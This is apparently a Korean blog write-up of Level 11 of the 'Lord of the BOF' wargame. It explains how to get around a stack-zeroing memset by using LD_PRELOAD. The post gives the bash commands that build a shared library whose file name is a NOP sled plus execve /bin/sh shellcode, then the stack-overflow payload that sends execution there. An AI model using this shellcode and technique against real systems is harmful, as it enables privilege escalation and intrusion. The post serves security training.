---
layout: post
title: "The Lord of the BOF - Level 11"
comments: true
categories: [LOB]
tags: [LOB]
---
<img data-action="zoom" src='{{ "assets/lob/level11/1.jpg" | relative_url }}' alt='relative'>  

## 1) skeleton/shellcoder 입력하여 로그인하기  

<img data-action="zoom" src='{{ "assets/lob/level11/2.png" | relative_url }}' alt='relative'>  

``` c
// stack destroyer!
memset(buffer, 0, 44);
memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));
```

argc, argv, envp, ... 등 buffer 배열 이후에 RET 부분을 제외하고 스택의 내용을 다 0으로 덮어써버립니다.  

이 문제를 풀기 위해서는 공유라이브러리와 LD_PRELOAD를 알아야 합니다.  

## 2) LD_PRELOAD 환경변수  

LD_PRELOAD 환경변수에 저장된 라이브러리를 기존 라이브러리가 로딩되기 전에 로딩합니다.  
기존 라이브러리에 LD_PRELOAD 환경변수에 저장된 라이브러리와 중복된 이름의 함수가 있는 경우 
LD_PRELOAD 환경변수에 저장된 라이브러리가 먼저 로딩되었으므로 LD_PRELOAD 환경변수에 저장된 라이브러리에서 함수를 호출합니다.  

LD_PRELOAD의 메모리 영역은 공유 라이브러리 영역으로, 공유 라이브러리 영역이 스택의 지역 변수 영역보다 낮은 주소에 존재합니다.  
``` c
// stack destroyer!
memset(buffer, 0, 44);
memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));
```
그래서 이 코드 부분에서 LD_PRELOAD 메모리 영역은 0으로 초기화되지 않고 값을 그대로 유지할 수 있습니다.  

이 문제를 풀기 위해서는 쉘코드를 포함하는 공유라이브러리를 생성하고 LD_PRELOAD에 해당 라이브러리를 설정하면 됩니다.  

## 3) 공유 라이브러리 만들기  

공유라이브러리를 만들기 위해 -fPIC 와 -shared 옵션을 사용해야 합니다.  

-fPIC 옵션은 Position Independent Code의 약자로 컴파일시 컴파일되는 파일을 동적라이브러리로 사용하도록 지정하는 옵션입니다.  
-shared 옵션은 공유 라이브러리를 만드는 옵션입니다.  

attack.c라는 빈 파일을 만들고 NOP과 쉘코드로 구성된 파일명으로 컴파일 합니다. 공유 라이브러리를 만들기 위해 컴파일시 -fPIC와 -shared 옵션을 넣어주었습니다.  

``` bash
touch attack.c

gcc -fPIC -shared attack.c -o `python -c 'print "\x90"*100+"\x90"*50+"\x31\xc0\x50\xb8\x97\x97\x39\x34\x05\x98\x97\x39\x34\x50\xb8\x17\xb1\x34\x37\x05\x18\xb1\x34\x37\x50\x31\xc0\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

파일명에 쉘코드를 포함하는 라이브러리를 절대경로로 입력하여 LD_PRELOAD 환경변수에 저장합니다.  

``` bash
 export LD_PRELOAD="/home/skeleton/`python -c 'print "\x90"*100+"\x90"*50+"\x31\xc0\x50\xb8\x97\x97\x39\x34\x05\x98\x97\x39\x34\x50\xb8\x17\xb1\x34\x37\x05\x18\xb1\x34\x37\x50\x31\xc0\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`"
```

<img data-action="zoom" src='{{ "assets/lob/level11/3.png" | relative_url }}' alt='relative'>  

## 4) 공유 라이브러리가 위치한 스택 주소 확인하기  

<img data-action="zoom" src='{{ "assets/lob/level11/4.png" | relative_url }}' alt='relative'>  

스택의 구조를 도식화한 그림입니다. 그림에서 보이는 것처럼 공유 라이브러리는 스택의 위에 위치하고 있습니다.  


<img data-action="zoom" src='{{ "assets/lob/level11/5.png" | relative_url }}' alt='relative'>  

스택이 현재 가리키는 주소를 저장하고있는 $esp 레지스터의 값에서 1500 byte 위에 있는 공간에는 어떤 값이 저장되어 있는지 출력해봤습니다.  
0xbffff55b에 LD_PRELOAD 환경변수에 저장하였던 공유 라이브러리가 위치하고 있습니다.  

main 함수 종료 후 반환될 주소를 0xbffff580 주소로 설정하기 위해 RET에 입력하겠습니다.  

## 5) 공격 페이로드 입력하여 BOF 일으키기  

``` bash
./golem `python -c 'print "A"*44+"\x80\xf5\xff\xbf"'`
```

<img data-action="zoom" src='{{ "assets/lob/level11/6.png" | relative_url }}' alt='relative'>  


